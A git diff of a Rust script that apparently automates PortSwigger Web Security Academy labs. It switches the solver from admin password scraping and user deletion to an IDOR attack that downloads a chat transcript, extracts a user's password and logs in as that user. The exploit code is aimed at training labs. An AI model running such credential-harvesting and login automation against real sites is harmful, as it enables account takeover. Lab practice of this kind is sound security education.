@@ -1,17 +1,16 @@
-/************************************************************************************
+/****************************************************************
 *
 * Author: Ahmed Elqalawii
 *
 * Date: 5/9/2023
 *
-* PortSwigger LAB: User ID controlled by request parameter with password disclosure
+* PortSwigger LAB: Insecure direct object references
 *
-* Steps: 1. Fetch administrator page via URL id parameter
-*        2. Extract the password from source code
-*        3. Login as administrator
-*        4. Delete carlos
+* Steps: 1. Fetch 1.txt log file
+*        2. Extract carlos password from the log file
+*        3. Login as carlos
 *
-*************************************************************************************/
+*****************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -35,31 +34,28 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a2f00c9041179a18123e1cc0010004e.web-security-academy.net";
+    let url = "https://0a440071031837728035c7be00dc0008.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
 
-    // fetch administrator profile vi URL id parameter
-    print!("{} ", "1. Fetching administrator profile page..".white());
+    // fetch 1.txt log file
+    print!("{} ", "1. Fetching 1.txt log file..".white());
     io::stdout().flush();
-    let admin_profile = client
-        .get(format!("{url}/my-account?id=administrator"))
+    let log_file = client
+        .get(format!("{url}/download-transcript/1.txt"))
         .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch administrator profile".red()
-        ));
+        .expect(&format!("{}", "[!] Failed to fetch 1.txt log file".red()));
     println!("{}", "OK".green());
 
-    // extract the password from source code
-    print!("{} ", "2. Extracting password from source code..".white());
+    // extract the password from the log file
+    print!("{} ", "2. Extracting password from the log file..".white());
     io::stdout().flush();
-    let body = admin_profile.text().unwrap();
-    let admin_pass = capture_pattern("name=password value='(.*)'", &body).expect(&format!(
+    let body = log_file.text().unwrap();
+    let carlos_pass = capture_pattern(r"password is (.*)\.", &body).expect(&format!(
         "{}",
-        "[!] Failed to extract the admin password".red()
+        "[!] Failed to extract the carlos password".red()
     ));
-    println!("{} => {}", "OK".green(), admin_pass.yellow());
+    println!("{} => {}", "OK".green(), carlos_pass.yellow());
 
     // fetch login page to get valid session csrf token
     print!(
@@ -76,33 +72,31 @@ fn main() {
     let csrf = extract_csrf(get_login).expect(&format!("{}", "[!] Failed extract csrf".red()));
     println!("{}", "OK".green());
 
-    // login as admin
-    print!("{} ", "4. Logging in as administrator..".white());
+    // login as carlos
+    print!("{} ", "4. Logging in as carlos..".white());
     io::stdout().flush();
     let login = client
         .post(format!("{url}/login"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
-            ("username", "administrator"),
-            ("password", &admin_pass),
+            ("username", "carlos"),
+            ("password", &carlos_pass),
             ("csrf", &csrf),
         ]))
         .send()
-        .expect(&format!("{}", "[!] Failed to login as admin".red()));
-    let new_session = extract_session_cookie(login.headers()).expect(&format!(
-        "{}",
-        "[!] Failed to extract new session cookie".red()
-    ));
+        .expect(&format!("{}", "[!] Failed to login as carlos".red()));
+    let carlos_session = extract_session_cookie(login.headers())
+        .expect(&format!("{}", "[!] Failed to extract new session".red()));
     println!("{}", "OK".green());
 
-    // delete carlos
-    print!("{} ", "5. Deleting carlos..".white());
+    // fetch carlos profile
+    print!("{} ", "5. Fetching carlos profile..".white());
     io::stdout().flush();
-    let delete_carlos = client
-        .get(format!("{url}/admin/delete?username=carlos"))
-        .header("Cookie", format!("session={new_session}"))
+    let carlos_profile = client
+        .get(format!("{url}/my-account"))
+        .header("Cookie", format!("session={carlos_session}"))
         .send()
-        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
+        .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));
     println!("{}", "OK".green());
 
     println!(
